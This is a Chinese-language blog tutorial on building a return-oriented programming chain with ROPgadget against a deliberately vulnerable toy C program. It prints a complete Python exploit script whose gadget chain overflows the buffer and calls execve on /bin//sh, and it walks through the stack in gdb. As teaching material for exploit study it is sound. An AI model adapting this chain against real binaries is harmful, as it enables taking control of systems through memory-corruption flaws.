title: 使用ROPgadget构建gadgets链，实现ROP攻击
date: 2015-06-12 15:34:53
tags:  
- 缓冲区溢出
- ROP
---
上篇博客简单介绍了ROPgadget，现在我们就来小试牛刀
<!-- more -->
#C程序
```
#include <string.h>
#include <stdio.h>

void function(char *a){
        char buff[40];
        strcpy(buff,a);
}
 
int main(int argc, char** argv){
    if(argc>=2)
        function(argv[1]);
}
```
编译C程序
```
gcc hello.c -o hello -static -g -fno-stack-protector
```
#使用ROPgadget构建gadget链
ROPgadget的安装[上篇博客](http://huirong.github.io/2015/06/12/ROPgadget/)已经介绍了,这里不赘述。
```
ropgadget --binary hello --ropchain
```
创建输入文件exploit.py
```
#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = ''
p += 'a'*52

p += pack('<I', 0x080570ca) # pop edx ; ret
p += pack('<I', 0x080ee060) # @ .data
p += pack('<I', 0x0808d211) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0808e28d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080570ca) # pop edx ; ret
p += pack('<I', 0x080ee064) # @ .data + 4
p += pack('<I', 0x0808d211) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0808e28d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080570ca) # pop edx ; ret
p += pack('<I', 0x080ee068) # @ .data + 8
p += pack('<I', 0x080514e0) # xor eax, eax ; ret
p += pack('<I', 0x0808e28d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481ec) # pop ebx ; ret
p += pack('<I', 0x080ee060) # @ .data
p += pack('<I', 0x080997d3) # pop ecx ; ret
p += pack('<I', 0x080ee068) # @ .data + 8
p += pack('<I', 0x080570ca) # pop edx ; ret
p += pack('<I', 0x080ee068) # @ .data + 8
p += pack('<I', 0x080514e0) # xor eax, eax ; ret
p += pack('<I', 0x08099b66) # inc eax ; ret
p += pack('<I', 0x08099b66) # inc eax ; ret
p += pack('<I', 0x08099b66) # inc eax ; ret
p += pack('<I', 0x08099b66) # inc eax ; ret
p += pack('<I', 0x08099b66) # inc eax ; ret
p += pack('<I', 0x08099b66) # inc eax ; ret
p += pack('<I', 0x08099b66) # inc eax ; ret
p += pack('<I', 0x08099b66) # inc eax ; ret
p += pack('<I', 0x08099b66) # inc eax ; ret
p += pack('<I', 0x08099b66) # inc eax ; ret
p += pack('<I', 0x08099b66) # inc eax ; ret
p += pack('<I', 0x080493b9) # int 0x80
print p
```
<font color="red">注意：要在gadget之前添加 p += 'a'*52</font>
原因：使函数的返回地址指向第一个gadget
#使用gdb分析内存
```
gdbtui hello
```
###1、添加断点，设置参数
根据自己喜欢在程序某个地方设置断点，我一般设置在主函数处
运行时参数为 ./exploit.py 的运行结果
![](http://ww3.sinaimg.cn/large/005CA6ZCjw1et1d063ftej30px0fq0yj.jpg)
###2、查看寄存器
当运行完strcpy()函数后，查看寄存器情况，主要留意esp  ebp的值
![](http://ww3.sinaimg.cn/large/005CA6ZCjw1et1d0cngncj30n80fp43t.jpg)
###3、查看内存情况
ebp为0xbffff288，则返回地址在0xbffff28c处，可以发现此时返回地址是第一个gadget的起始地址处
<font color="red">p += 'a'*52 是为了覆盖缓冲区，直到返回地址处</font>
![](http://ww1.sinaimg.cn/large/005CA6ZCjw1et1d0lh38xj30nr05rads.jpg)
#运行结果
```
./hello "$(./exploit.py)"
```
![](http://ww2.sinaimg.cn/large/005CA6ZCjw1et1d0ryguaj30fe016t8q.jpg)
#参考文献
[use ROPgadget to chain gadgets](https://hwchen18546.wordpress.com/2014/07/15/rop-use-ropgadget-to-chain-gadgets/)
